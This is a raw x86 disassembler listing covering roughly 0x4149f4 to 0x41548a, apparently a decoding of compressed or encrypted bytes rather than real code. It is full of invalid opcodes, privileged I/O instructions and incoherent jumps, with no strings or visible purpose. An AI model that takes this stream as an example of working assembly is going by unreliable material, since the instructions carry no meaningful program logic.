  4149f4:	xchg   ecx,eax
  4149f5:	in     al,0x84
  4149f7:	(bad)
  4149fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149fc:	fcomip st,st(7)
  4149fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149ff:	ror    al,0x47
  414a02:	jge    0x414a07
  414a04:	out    0x53,al
  414a06:	sub    DWORD PTR [eax],0xb
  414a09:	je     0x4149b2
  414a0b:	xchg   ebp,eax
  414a0c:	mov    ebx,0x560e9541
  414a11:	adc    al,0x42
  414a13:	push   ss
  414a14:	shl    DWORD PTR [ecx+0x2e],cl
  414a17:	hlt    
  414a18:	mov    esp,ebx
  414a1a:	scas   al,BYTE PTR es:[edi]
  414a1b:	mov    ecx,0x6eccee00
  414a20:	mov    ecx,cs
  414a22:	cmc    
  414a23:	jmp    DWORD PTR ds:0x3496c722
  414a29:	cmp    BYTE PTR [edi+0x45bf0eff],ah
  414a2f:	dec    ebp
  414a30:	leave  
  414a31:	add    al,0xb4
  414a33:	dec    ecx
  414a34:	push   ds
  414a35:	and    DWORD PTR [ecx-0x5d4da9cb],esp
  414a3b:	cmp    eax,0xd67b2873
  414a40:	nop
  414a41:	push   edi
  414a42:	cdq    
  414a43:	jno    0x4149cb
  414a45:	mov    al,ds:0xb6af6015
  414a4a:	rol    DWORD PTR [edi],cl
  414a4c:	mov    ebp,0x27f9340e
  414a51:	mov    edx,0x43ded0a5
  414a56:	ror    DWORD PTR [esi-0x15],cl
  414a59:	pop    ebp
  414a5a:	or     dl,BYTE PTR [eax+0x4969243f]
  414a60:	stos   BYTE PTR es:[edi],al
  414a61:	inc    edi
  414a62:	int    0x8d
  414a64:	daa    
  414a65:	inc    eax
  414a66:	push   ss
  414a67:	xchg   ebp,eax
  414a68:	repnz dec esi
  414a6a:	jnp    0x414aaa
  414a6c:	(bad)  
  414a6d:	xchg   esp,eax
  414a6e:	fistp  WORD PTR [edx]
  414a70:	jmp    0x414ac1
  414a72:	clc    
  414a73:	hlt    
  414a74:	sub    al,0x4a
  414a76:	dec    esp
  414a77:	repnz or al,0x11
  414a7a:	in     al,0x58
  414a7c:	adc    eax,0xfbdae1d8
  414a81:	cmp    al,0xa6
  414a83:	mov    al,ds:0x5195e072
  414a88:	mov    edi,0x940b519e
  414a8d:	inc    ebp
  414a8e:	int3   
  414a8f:	jnp    0x414aee
  414a91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a92:	nop
  414a93:	test   DWORD PTR [edx-0x14de38cc],esp
  414a99:	push   edi
  414a9a:	cmp    dl,BYTE PTR [ebx+0x2f64cd7b]
  414aa0:	sub    cl,dl
  414aa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414aa3:	xor    ah,BYTE PTR [edi-0x68]
  414aa6:	mov    edx,0x1182001d
  414aab:	xchg   esp,edx
  414aad:	and    al,0x6c
  414aaf:	add    DWORD PTR [edi-0x66],esi
  414ab2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ab3:	scas   al,BYTE PTR es:[edi]
  414ab4:	enter  0x256e,0xfd
  414ab8:	cmp    al,0x7e
  414aba:	sbb    DWORD PTR [eax],esi
  414abc:	push   esi
  414abd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414abe:	int3   
  414abf:	test   eax,0xc3738e24
  414ac4:	test   edi,eax
  414ac6:	mov    dh,0x66
  414ac8:	jmp    0xdb88:0x63b6105f
  414acf:	dec    ebp
  414ad0:	imul   eax,edx,0x511746f2
  414ad6:	mov    ds:0xc17a7d7,al
  414adb:	jns    0x414acd
  414add:	sbb    DWORD PTR ds:0xf0f7c0e8,0x13
  414ae4:	jmp    DWORD PTR [edi+0x5cb377c9]
  414aea:	or     edi,esp
  414aec:	call   FWORD PTR [ebx+0x0]
	...
  414b53:	add    BYTE PTR [eax],al
  414b55:	add    BYTE PTR [edi+0x7e363ed9],bl
  414b5b:	neg    DWORD PTR [edi-0x265c9d07]
  414b61:	arpl   WORD PTR [edi+0x74],di
  414b64:	mov    WORD PTR [esi+0xdf67],es
  414b6a:	add    BYTE PTR [ecx],al
  414b6c:	add    BYTE PTR [eax],al
  414b6e:	pop    eax
  414b6f:	cwde   
  414b70:	js     0x414b43
  414b72:	cmp    BYTE PTR [ebx+0x56],al
  414b75:	test   DWORD PTR [eax],esp
  414b77:	adc    bh,BYTE PTR [edi+0x16]
  414b7a:	dec    ebx
  414b7b:	sub    al,0x4f
  414b7d:	push   es
  414b7e:	pop    ecx
  414b7f:	fs out 0x3a,eax
  414b82:	(bad)  
  414b83:	ds mov cl,0x3b
  414b86:	pop    ss
  414b87:	jns    0x414b58
  414b89:	mov    dh,0xca
  414b8b:	dec    ebx
  414b8c:	out    dx,al
  414b8d:	dec    edi
  414b8e:	adc    BYTE PTR ds:0xeca15f0e,ch
  414b94:	and    bh,BYTE PTR ds:[edx]
  414b97:	sub    BYTE PTR [esp+ebp*4-0x5df35585],0xc6
  414b9f:	jae    0x414c00
  414ba1:	mov    cl,BYTE PTR [ecx-0x1f9d1f63]
  414ba7:	xchg   ebx,ecx
  414ba9:	sub    BYTE PTR [ebp+0x44],dl
  414bac:	fnstsw WORD PTR [eax]
  414bae:	sbb    BYTE PTR [edx],ch
  414bb0:	mov    edx,0xa310dd2d
  414bb5:	test   BYTE PTR ds:0xe73bd81d,dh
  414bbb:	or     DWORD PTR [eax],0x2902734f
  414bc1:	call   0xf9d0:0x3504646
  414bc8:	dec    ebp
  414bc9:	addr16 arpl di,bp
  414bcc:	push   edx
  414bcd:	out    dx,al
  414bce:	fidivr DWORD PTR [edx-0x52]
  414bd1:	ja     0x414c1a
  414bd3:	push   ebx
  414bd4:	and    BYTE PTR [ebx+0x5593ca6],bl
  414bda:	sub    BYTE PTR [eax+0x3f35996f],dh
  414be0:	and    al,0xc5
  414be2:	popf   
  414be3:	les    edx,FWORD PTR [edi]
  414be5:	shl    DWORD PTR [eax],cl
  414be7:	dec    ebp
  414be8:	fld    QWORD PTR [eax-0x31d98c42]
  414bee:	stos   DWORD PTR es:[edi],eax
  414bef:	xchg   BYTE PTR [edx],dh
  414bf1:	adc    al,0xed
  414bf3:	push   ecx
  414bf4:	push   esp
  414bf5:	jne    0x414be4
  414bf7:	rcr    DWORD PTR [eax],1
  414bf9:	add    al,0xab
  414bfb:	xor    DWORD PTR [ebx+ebp*1-0x2e8b21c9],edi
  414c02:	xchg   DWORD PTR [esi+0x3fc5deba],esp
  414c08:	and    eax,0x1a6496f0
  414c0d:	adc    BYTE PTR ds:0x9dd2dfd4,bh
  414c13:	and    ebp,DWORD PTR [eax]
  414c15:	inc    edx
  414c16:	lock jl 0x414c65
  414c19:	jecxz  0x414c11
  414c1b:	retf   
  414c1c:	sub    ah,BYTE PTR [edi+0x75]
  414c1f:	lods   al,BYTE PTR ds:[esi]
  414c20:	pop    ebx
  414c21:	in     eax,dx
  414c22:	jnp    0x414c88
  414c24:	popa   
  414c25:	je     0x414c32
  414c27:	and    bl,al
  414c29:	sar    dh,1
  414c2b:	fidivr WORD PTR [eax]
  414c2d:	test   DWORD PTR [ebx+0x67165355],0xd1073f6d
  414c37:	pop    esp
  414c38:	xchg   esi,eax
  414c39:	mov    BYTE PTR [eax+0x77],ah
  414c3c:	iret   
  414c3d:	mov    ah,0xfa
  414c3f:	mov    al,0xc4
  414c41:	mov    ebp,0x6e70623c
  414c46:	ins    BYTE PTR es:[edi],dx
  414c47:	xchg   BYTE PTR [ecx+0x46],ch
  414c4a:	test   cl,ch
  414c4c:	ss mov bh,0x2f
  414c4f:	sbb    ah,BYTE PTR [ecx-0x78]
  414c52:	lds    ebp,FWORD PTR [ebp+0x29]
  414c55:	xchg   ebp,eax
  414c56:	mov    esi,DWORD PTR [ebp-0x3f]
  414c59:	inc    edx
  414c5a:	aam    0xae
  414c5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c5d:	mov    edi,0xfcea65e0
  414c62:	rcl    DWORD PTR [esi+esi*2],1
  414c65:	jo     0x414c7a
  414c67:	sahf   
  414c68:	retf   
  414c69:	int    0x79
  414c6b:	pop    ss
  414c6c:	pop    edx
  414c6d:	mov    es,WORD PTR [eax]
	...
  414cd3:	add    BYTE PTR [eax],al
  414cd5:	add    BYTE PTR [esp+eiz*2],dh
  414cd8:	push   ds
  414cd9:	jl     0x414d39
  414cdb:	jle    0x414d53
  414cdd:	ins    BYTE PTR es:[edi],dx
  414cde:	out    0x12,al
  414ce0:	adc    ebx,DWORD PTR cs:[edi]
  414ce3:	test   DWORD PTR [eax+0x4d],ebp
  414ce6:	addr16 loopne 0x414ce9
  414ce9:	add    BYTE PTR [eax],al
  414ceb:	add    DWORD PTR [eax],eax
  414ced:	add    BYTE PTR ds:0x43f3cf12,dl
  414cf3:	icebp  
  414cf4:	xor    BYTE PTR [esi+ebp*4-0x277e6f5a],0x41
  414cfc:	icebp  
  414cfd:	dec    eax
  414cfe:	bound  ecx,QWORD PTR [eax]
  414d00:	imul   eax,edi,0x92bb14ee
  414d06:	cli    
  414d07:	adc    BYTE PTR [esi+0x318331a0],dl
  414d0d:	lock jmp 0xfe9e:0x72aeb7a6
  414d15:	in     al,0x6d
  414d17:	frstor [eax]
  414d19:	fwait
  414d1a:	imul   edi,DWORD PTR ds:0xdbf48ce1,0x95fc3e19
  414d24:	fwait
  414d25:	or     esp,DWORD PTR [edx-0x737ce1cb]
  414d2b:	push   edx
  414d2c:	cs out 0x70,eax
  414d2f:	repnz rol DWORD PTR [edx],1
  414d32:	dec    edx
  414d33:	neg    edi
  414d35:	leave  
  414d36:	pop    es
  414d37:	mov    ah,0xfb
  414d39:	iret   
  414d3a:	out    0x57,al
  414d3c:	and    eax,0x21bd1b20
  414d41:	add    dh,BYTE PTR [ebp+0x5860baa9]
  414d47:	pop    ss
  414d48:	pop    esp
  414d49:	inc    eax
  414d4a:	cli    
  414d4b:	psubusw mm2,mm2
  414d4e:	inc    ebx
  414d4f:	or     ch,ch
  414d51:	inc    BYTE PTR [esi+0x50]
  414d54:	stc    
  414d55:	mov    ds:0x1f6054ea,al
  414d5a:	rcr    DWORD PTR [edi-0x1f9d6fd9],1
  414d60:	push   ebp
  414d61:	sub    BYTE PTR ss:[edx+0x1490c0b7],bh
  414d68:	jecxz  0x414d82
  414d6a:	xlat   BYTE PTR ds:[bx]
  414d6c:	ret    0xa686
  414d6f:	push   edx
  414d70:	push   esp
  414d71:	clc    
  414d72:	addr16 jbe 0x414d3a
  414d75:	sub    eax,0x4ffc230c
  414d7a:	dec    ebp
  414d7b:	lods   eax,DWORD PTR ds:[esi]
  414d7c:	sti    
  414d7d:	jnp    0x414de4
  414d7f:	mov    bl,0xb5
  414d81:	mov    ch,0x72
  414d83:	pop    ebx
  414d84:	mov    eax,0xdd74b103
  414d89:	sub    ecx,DWORD PTR ss:[ebp-0x58366b9]
  414d90:	cmp    ebx,esp
  414d92:	adc    DWORD PTR [esi-0x5793e68a],edx
  414d98:	sbb    eax,0xa05b00e5
  414d9d:	shl    DWORD PTR [esi+0x6c388b6a],1
  414da3:	adc    bh,BYTE PTR [edx]
  414da5:	dec    edx
  414da6:	lock inc esi
  414da8:	call   0x37be952c
  414dad:	aad    0x1
  414daf:	in     eax,0x55
  414db1:	mov    bl,0x90
  414db3:	lock jge 0x414e34
  414db6:	or     ebp,esp
  414db8:	sbb    eax,0x1273245d
  414dbd:	xchg   edi,eax
  414dbe:	and    edx,DWORD PTR [ecx-0x47]
  414dc1:	stos   DWORD PTR es:[edi],eax
  414dc2:	inc    ebp
  414dc3:	and    DWORD PTR [ebp-0x3ff14360],ebx
  414dc9:	mov    BYTE PTR [edx+ecx*2],al
  414dcc:	or     ebp,DWORD PTR [edx]
  414dce:	push   ss
  414dcf:	stos   DWORD PTR es:[edi],eax
  414dd0:	push   ss
  414dd1:	xchg   ebp,eax
  414dd2:	cmp    al,0xdd
  414dd4:	pushf  
  414dd5:	push   cs
  414dd6:	jne    0x414da2
  414dd8:	nop
  414dd9:	mov    eax,0x4029a287
  414dde:	cmp    al,0xfc
  414de0:	pop    es
  414de1:	jne    0x414e38
  414de3:	mov    ecx,DWORD PTR [eax]
  414de5:	pop    esi
  414de6:	sub    BYTE PTR [edi],0xc4
  414de9:	or     bl,BYTE PTR [ecx+0x34]
  414dec:	pop    esp
  414ded:	ins    DWORD PTR es:[edi],dx
	...
  414e56:	mov    bh,0x99
  414e58:	adc    dl,BYTE PTR [ecx-0x404864c2]
  414e5e:	in     al,dx
  414e5f:	xor    dh,BYTE PTR [esi]
  414e61:	adc    eax,0x37ad1f48
  414e66:	addr16 loope 0x414e69
  414e69:	add    BYTE PTR [eax],al
  414e6b:	add    DWORD PTR [eax],eax
  414e6d:	add    BYTE PTR [ecx+0x74285e17],dh
  414e73:	stos   DWORD PTR es:[edi],eax
  414e74:	dec    edx
  414e75:	adc    dh,0x42
  414e78:	add    eax,0xd6ed10d7
  414e7d:	jb     0x414ec7
  414e7f:	jmp    0xc818093d
  414e84:	mov    ebp,0xea84fff6
  414e89:	mov    al,ds:0x76926e4a
  414e8e:	fs icebp 
  414e90:	sub    bh,bh
  414e92:	dec    edi
  414e93:	push   ecx
  414e94:	pop    ds
  414e95:	pop    ecx
  414e96:	add    BYTE PTR [eax+0x49],dl
  414e99:	xlat   BYTE PTR ds:[ebx]
  414e9a:	or     eax,DWORD PTR [ebx+esi*1+0x602f6d9f]
  414ea1:	xchg   cl,dl
  414ea3:	popf   
  414ea4:	into   
  414ea5:	xchg   ecx,eax
  414ea6:	push   ebp
  414ea7:	ins    DWORD PTR es:[edi],dx
  414ea8:	xchg   esp,eax
  414ea9:	es mov ah,0xf2
  414eac:	das    
  414ead:	ins    DWORD PTR es:[edi],dx
  414eae:	shl    bl,1
  414eb0:	leave  
  414eb1:	mov    ds:0x366dfa47,al
  414eb6:	test   BYTE PTR ds:0xc4f25000,al
  414ebc:	call   0x7546933e
  414ec1:	(bad)  
  414ec2:	arpl   WORD PTR [eax+0x7b],si
  414ec5:	repz adc DWORD PTR fs:[edx],0xffffff9e
  414eca:	icebp  
  414ecb:	push   esp
  414ecc:	pop    ds
  414ecd:	inc    esp
  414ece:	popa   
  414ecf:	or     BYTE PTR [esi-0x4b],ch
  414ed2:	add    al,0xdf
  414ed4:	fst    QWORD PTR [edi-0x3d]
  414ed7:	sub    DWORD PTR [eax+0x51],edx
  414eda:	imul   ecx,DWORD PTR [edi-0x56],0x2cdeffa1
  414ee1:	arpl   bx,ax
  414ee3:	xor    ch,BYTE PTR [ebp-0x5a]
  414ee6:	push   ebx
  414ee7:	or     al,0x2d
  414ee9:	fist   DWORD PTR [edx]
  414eeb:	push   0xa128be6
  414ef0:	adc    esi,ebx
  414ef2:	cmp    al,0xab
  414ef4:	idiv   BYTE PTR [ebp-0x71]
  414ef7:	in     eax,dx
  414ef8:	push   ebx
  414ef9:	f2xm1  
  414efb:	adc    al,0xf
  414efd:	add    bh,ah
  414eff:	cmp    al,0xd1
  414f01:	xor    DWORD PTR [ebx-0x78],esp
  414f04:	iret   
  414f05:	ja     0x414f85
  414f07:	mov    ds:0x3cbf2596,eax
  414f0c:	jl     0x414f25
  414f0e:	pop    es
  414f0f:	(bad)  [esi+0x3f]
  414f12:	in     eax,0x89
  414f14:	sbb    esi,esi
  414f16:	mov    es,WORD PTR ss:[eax]
  414f19:	imul   esi,DWORD PTR cs:[esi-0x45],0x3dffd593
  414f21:	sar    cl,1
  414f23:	je     0x414f24
  414f25:	pop    esi
  414f26:	and    bh,BYTE PTR [edx]
  414f28:	inc    edx
  414f29:	loop   0x414eed
  414f2b:	jmp    0x414f03
  414f2d:	sub    eax,0x45cad899
  414f32:	in     eax,0x51
  414f34:	test   eax,0x4fd37ba7
  414f39:	xchg   esi,eax
  414f3a:	dec    edx
  414f3b:	jne    0x414f37
  414f3d:	rol    DWORD PTR [ebx+edi*4-0x7],cl
  414f41:	inc    eax
  414f42:	or     BYTE PTR [ebx+0x14],cl
  414f45:	aas    
  414f46:	in     eax,dx
  414f47:	add    eax,0x1bdeae95
  414f4c:	and    ebp,ebp
  414f4e:	add    edi,DWORD PTR [ebx+0x4efa3ceb]
  414f54:	imul   edi,DWORD PTR [ecx],0x4c
  414f57:	jmp    DWORD PTR [esi]
  414f59:	mul    BYTE PTR [ecx+0xf6ec217]
  414f5f:	mov    WORD PTR [edi],es
  414f61:	pop    esp
  414f62:	aas    
  414f63:	sbb    dl,BYTE PTR [ebx+0x678fee69]
  414f69:	and    eax,0x3b24fac0
	...
  414fd6:	aaa    
  414fd7:	data16 xor al,0x9b
  414fda:	jne    0x414fb7
  414fdc:	mov    edi,0xe45ae5ee
  414fe1:	call   0xe267:0xc9335922
  414fe8:	add    BYTE PTR [eax],al
  414fea:	add    BYTE PTR [ecx],al
  414fec:	add    BYTE PTR [eax],al
  414fee:	jmp    0x26db85dd
  414ff3:	xchg   DWORD PTR [esi-0x6f683a3c],edx
  414ff9:	dec    ebp
  414ffa:	outs   dx,DWORD PTR ds:[esi]
  414ffb:	xchg   edx,eax
  414ffc:	into   
  414ffd:	xor    BYTE PTR [edx+edx*1-0x57ec1b8b],bh
  415004:	aam    0x97
  415006:	je     0x414fd3
  415008:	in     eax,dx
  415009:	sbb    dl,BYTE PTR [edx-0x6f]
  41500c:	mov    eax,0x544c9d97
  415011:	fldz   
  415013:	scas   al,BYTE PTR es:[edi]
  415014:	cmp    al,0x58
  415016:	mov    ah,ah
  415018:	xchg   esp,eax
  415019:	inc    ebx
  41501a:	pop    edx
  41501b:	fwait
  41501c:	xor    dl,bh
  41501e:	inc    ebx
  41501f:	lea    esi,[ebp+0x4a954516]
  415025:	test   DWORD PTR [eax+0x1a3acd38],esp
  41502b:	fadd   QWORD PTR [ebx]
  41502d:	outs   dx,DWORD PTR ds:[esi]
  41502e:	rol    dl,1
  415030:	push   ecx
  415031:	adc    bl,bl
  415033:	sub    eax,0xcdb0fe5b
  415038:	jo     0x415049
  41503a:	retf   
  41503b:	cwde   
  41503c:	and    BYTE PTR [esi-0x78],ah
  41503f:	push   0x318881e0
  415044:	out    0x5a,al
  415046:	inc    eax
  415047:	adc    dh,ah
  415049:	(bad)  [esi]
  41504b:	xor    al,0xe3
  41504d:	mov    BYTE PTR [edi],al
  41504f:	out    dx,al
  415050:	cld    
  415051:	fsubr  DWORD PTR [edx-0x58]
  415054:	xor    bh,dh
  415056:	inc    eax
  415057:	adc    DWORD PTR [ecx],ecx
  415059:	pop    edi
  41505a:	shr    ecx,1
  41505c:	cli    
  41505d:	sar    DWORD PTR [edi-0x6d9668f5],cl
  415063:	push   eax
  415064:	outs   dx,BYTE PTR ds:[esi]
  415065:	das    
  415066:	pop    ecx
  415067:	jbe    0x415013
  415069:	pop    edx
  41506a:	sub    BYTE PTR [eax],ah
  41506c:	xor    DWORD PTR ds:0x60ffe36,eax
  415072:	fcomp  DWORD PTR [edi-0x2e88a78d]
  415078:	aad    0xac
  41507a:	mov    DWORD PTR [ecx-0x20],ecx
  41507d:	and    dl,BYTE PTR [ebx+0x76]
  415080:	xor    ax,0xba73
  415084:	fcmovnu st,st(6)
  415086:	enter  0xb8ce,0xe5
  41508a:	xlat   BYTE PTR ds:[ebx]
  41508b:	scas   eax,DWORD PTR es:[edi]
  41508c:	sbb    BYTE PTR [edx-0x68cc0992],0x43
  415093:	gs mov ebp,0xf6e0f324
  415099:	out    0xba,eax
  41509b:	aas    
  41509c:	imul   ecx,DWORD PTR [ebx],0xc53caa2c
  4150a2:	add    eax,0xa38cdb92
  4150a7:	mov    esp,DWORD PTR [ebx]
  4150a9:	jecxz  0x415064
  4150ab:	push   esi
  4150ac:	or     BYTE PTR [ecx],ch
  4150ae:	sbb    al,0xce
  4150b0:	aad    0x95
  4150b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150b3:	int3   
  4150b4:	pop    ecx
  4150b5:	adc    al,0x66
  4150b7:	cmp    eax,0xcbfd713
  4150bc:	call   0xa082:0x6e883f89
  4150c3:	mov    eax,0x62940071
  4150c8:	and    ah,ch
  4150ca:	sbb    DWORD PTR [ebx+0x15],edx
  4150cd:	and    al,0xcd
  4150cf:	jbe    0x4150d1
  4150d1:	sbb    ebx,DWORD PTR [edi-0x7d4ef3f1]
  4150d7:	sbb    al,0x3
  4150d9:	adc    eax,ebx
  4150db:	cmp    esi,DWORD PTR [ebx-0x9]
  4150de:	mov    dl,BYTE PTR [eax+ebp*2]
  4150e1:	imul   edx,DWORD PTR [edi+0x20],0xffffffbc
  4150e5:	and    esi,DWORD PTR ds:0x68360e4d
  4150eb:	add    edx,esp
  4150ed:	inc    edi
	...
  415156:	jnp    0x41515a
  415158:	add    ebp,ebx
  41515a:	jnp    0x415147
  41515c:	sti    
  41515d:	xchg   edx,eax
  41515e:	lahf   
  41515f:	mov    esi,0xc310fc2d
  415164:	cmp    eax,0xe36759
  415169:	add    BYTE PTR [eax],al
  41516b:	add    DWORD PTR [eax],eax
  41516d:	add    dh,dl
  41516f:	pop    eax
  415170:	fwait
  415171:	xchg   edx,eax
  415172:	lods   al,BYTE PTR ds:[esi]
  415173:	ins    DWORD PTR es:[edi],dx
  415174:	xor    al,0xb4
  415176:	out    0xa2,eax
  415178:	xchg   edi,eax
  415179:	pop    esi
  41517a:	stos   BYTE PTR es:[edi],al
  41517b:	xchg   ecx,eax
  41517c:	push   cs
  41517d:	jp     0x41515e
  41517f:	cdq    
  415180:	je     0x415104
  415182:	fwait
  415183:	aad    0x29
  415185:	push   es
  415186:	mov    ch,0x12
  415188:	(bad)  
  415189:	adc    BYTE PTR [ebp+0x2eb80941],bl
  41518f:	push   esi
  415190:	aaa    
  415191:	and    al,0x7
  415193:	inc    edi
  415194:	push   es
  415195:	ss xchg ecx,eax
  415197:	imul   eax,DWORD PTR [esi+0x27],0x63f55036
  41519e:	sbb    edx,DWORD PTR [edx+0x62]
  4151a1:	mov    al,0xb8
  4151a3:	jg     0x415147
  4151a5:	sub    DWORD PTR [eax-0xf090cd1],edx
  4151ab:	adc    BYTE PTR [ecx-0x5e17aee3],dl
  4151b1:	and    dl,BYTE PTR ds:0x41b03c55
  4151b7:	sub    BYTE PTR [eiz*4-0xb15e610],bl
  4151be:	fs add eax,0x3463f8b
  4151c4:	in     al,0x10
  4151c6:	stos   BYTE PTR es:[edi],al
  4151c7:	mov    ch,0xe6
  4151c9:	xchg   ebp,eax
  4151ca:	and    BYTE PTR [edx+eax*1],ch
  4151cd:	pop    edx
  4151ce:	sub    cl,bh
  4151d0:	loop   0x4151d9
  4151d2:	or     ebp,DWORD PTR [esi-0x5575920e]
  4151d8:	pop    ebx
  4151d9:	xchg   ecx,eax
  4151da:	aaa    
  4151db:	sub    ebp,DWORD PTR [ebx-0x4e960c9f]
  4151e1:	mov    cl,0xe9
  4151e3:	test   al,0xd5
  4151e5:	jmp    0x2df3:0x620c5674
  4151ec:	arpl   WORD PTR [ebp+0x32],ax
  4151ef:	loop   0x415262
  4151f1:	scas   eax,DWORD PTR es:[edi]
  4151f2:	pop    eax
  4151f3:	push   ecx
  4151f4:	dec    edi
  4151f5:	xor    ecx,DWORD PTR [edx+0x24]
  4151f8:	mov    BYTE PTR [ecx],cl
  4151fa:	cmp    al,0xce
  4151fc:	mov    al,ds:0xed447d2e
  415201:	jge    0x41518f
  415203:	cmp    edi,0xffffffa5
  415206:	add    al,BYTE PTR ds:0x2ec054d4
  41520c:	mov    dh,0x5
  41520e:	mov    ah,0xf6
  415210:	call   0xfc387c7
  415215:	sahf   
  415216:	adc    al,0xdc
  415218:	mov    ds:0x35bd20dd,eax
  41521d:	add    eax,0x109bce39
  415222:	ficomp WORD PTR ds:[ebx-0x4e]
  415226:	mov    ah,0x85
  415228:	push   ebp
  415229:	fiadd  WORD PTR [edi+edi*4-0x1b]
  41522d:	xchg   esp,eax
  41522e:	push   esp
  41522f:	fchs   
  415231:	sub    ch,cl
  415233:	sti    
  415234:	lods   al,BYTE PTR ds:[esi]
  415235:	jmp    0x41523c
  415237:	sub    al,0x6d
  415239:	fdiv   QWORD PTR [edx]
  41523b:	(bad)  
  41523c:	sbb    DWORD PTR [ebp-0x75],0xd53a139e
  415243:	or     eax,0xe07a9820
  415248:	xchg   ebp,eax
  415249:	test   edi,edi
  41524b:	sahf   
  41524c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41524d:	jo     0x415202
  41524f:	shr    BYTE PTR [ebp+0x6b0a582a],cl
  415255:	ins    BYTE PTR es:[edi],dx
  415256:	clc    
  415257:	sub    DWORD PTR [ebx-0x3c9adb95],esi
  41525d:	in     al,0xdc
  41525f:	pop    ebx
  415260:	cld    
  415261:	ds inc ebx
  415263:	cmp    BYTE PTR [ebx-0x75def009],ch
  415269:	movaps XMMWORD PTR [esi],xmm4
  41526c:	mov    edx,0x6c
	...
  4152d5:	add    BYTE PTR [edi+edx*4],ch
  4152d8:	pop    ds
  4152d9:	sar    DWORD PTR [edi-0x6001127],1
  4152df:	(bad)  
  4152e0:	mov    ecx,0xc0d5d90b
  4152e5:	inc    esi
  4152e6:	addr16 in al,0x0
  4152e9:	add    BYTE PTR [eax],al
  4152eb:	add    DWORD PTR [eax],eax
  4152ed:	add    BYTE PTR [esi-0x1],dl
  4152f0:	imul   edx,DWORD PTR [ebp+0x56fee4e5],0x2d
  4152f7:	dec    ecx
  4152f8:	popf   
  4152f9:	popf   
  4152fa:	mov    DWORD PTR [ebx+0x28],edi
  4152fd:	mov    eax,ds:0x4dd22b93
  415302:	out    0x1d,al
  415304:	inc    esp
  415305:	and    BYTE PTR [esi-0x38de834a],0xca
  41530c:	inc    eax
  41530d:	jmp    0xb884:0x8beff03b
  415314:	sub    BYTE PTR [edx+eax*2+0x68],bh
  415318:	dec    edi
  415319:	in     eax,0x38
  41531b:	into   
  41531c:	xchg   BYTE PTR [esi-0xa2e6812],dh
  415322:	xor    BYTE PTR [eax+0x2ff5c15b],ah
  415328:	pop    edi
  415329:	sub    DWORD PTR [ebp+0x3d],edi
  41532c:	shr    DWORD PTR [ebx],0x48
  41532f:	iret   
  415330:	idiv   DWORD PTR [edx-0x40]
  415333:	aad    0x2d
  415335:	int    0x79
  415337:	dec    edx
  415338:	in     al,0xcc
  41533a:	(bad)  
  41533b:	xchg   edi,eax
  41533c:	jmp    0xbe10:0xff2feb8b
  415343:	pop    ds
  415344:	repz fdivr QWORD PTR fs:[ebx]
  415348:	adc    eax,0xcddca953
  41534d:	nop
  41534e:	repnz pop ebx
  415350:	jle    0x4152df
  415352:	cmp    BYTE PTR [eax],bh
  415354:	inc    ebp
  415355:	cld    
  415356:	push   ecx
  415357:	mov    esp,0x1e2e89c3
  41535c:	test   al,0x70
  41535e:	aaa    
  41535f:	add    eax,0x2a2a2f68
  415364:	inc    edi
  415365:	lods   al,BYTE PTR ds:[esi]
  415366:	(bad)  
  415367:	pop    esi
  415368:	dec    esi
  415369:	pop    edx
  41536a:	push   0xcc2f64b1
  41536f:	sbb    ch,dl
  415371:	in     al,dx
  415372:	popw   es
  415374:	and    edi,DWORD PTR [ecx]
  415376:	xchg   bl,dh
  415378:	fidiv  DWORD PTR [esi-0x630bb12d]
  41537e:	into   
  41537f:	out    0x4a,eax
  415381:	sbb    eax,0x73baf65f
  415386:	rcr    DWORD PTR [eax],1
  415388:	pop    esp
  415389:	push   ebx
  41538a:	cmp    cl,BYTE PTR [eax-0x59418962]
  415390:	test   DWORD PTR [edi],0x29ad624b
  415396:	cmp    bh,bh
  415398:	mov    al,ds:0xfdb1983f
  41539d:	sub    DWORD PTR [edx+esi*4-0x507fa752],0xffffff8f
  4153a5:	iret   
  4153a6:	retf   0xaaba
  4153a9:	sbb    BYTE PTR [edi+0x27853f10],0x44
  4153b0:	imul   esp,DWORD PTR [edi],0xfffffffb
  4153b3:	mov    WORD PTR [edx+0x74],fs
  4153b6:	jg     0x415358
  4153b8:	dec    edx
  4153b9:	int    0xf
  4153bb:	imul   esi,DWORD PTR [esi],0x13
  4153be:	ret    
  4153bf:	xchg   DWORD PTR [eax+eax*8],esp
  4153c2:	xor    dl,bl
  4153c4:	adc    DWORD PTR [edi+0x7b8573af],edi
  4153ca:	push   ss
  4153cb:	dec    ebp
  4153cc:	jns    0x41539f
  4153ce:	dec    edi
  4153cf:	push   edx
  4153d0:	aaa    
  4153d1:	mov    DWORD PTR [esi-0x3f4741de],ebp
  4153d7:	data16 icebp 
  4153d9:	sbb    edi,ecx
  4153db:	pop    DWORD PTR ds:0x8b67bd34
  4153e1:	jmp    0x41545c
  4153e3:	(bad)  
  4153e4:	lods   al,BYTE PTR ds:[esi]
  4153e5:	pusha  
  4153e6:	int3   
  4153e7:	add    al,0xca
  4153e9:	in     al,dx
  4153ea:	mov    edx,0x2349e8
	...
  415453:	add    BYTE PTR [eax],al
  415455:	add    BYTE PTR [ebp-0x10],ch
  415458:	repz jmp FWORD PTR cs:[edi]
  41545c:	std    
  41545d:	repz mov edi,0xf0d3e5b0
  415463:	or     BYTE PTR [ecx+0xe5679e],bh
  415469:	add    BYTE PTR [eax],al
  41546b:	add    DWORD PTR [eax],eax
  41546d:	add    BYTE PTR [edx],dh
  41546f:	bound  ebp,QWORD PTR [edi+0x5f]
  415472:	xchg   BYTE PTR [ebx],ch
  415474:	sub    BYTE PTR [eax-0x4520d149],dl
  41547a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41547b:	lock mov esi,0xffe46ff6
  415481:	add    al,0xc2
  415483:	popa   
  415484:	push   eax
  415485:	es loope 0x415502
  415488:	outs   dx,DWORD PTR ds:[esi]
  415489:	scas   eax,DWORD PTR es:[edi]
  41548a:	sbb    DWORD PTR [esi-0x6f],edx
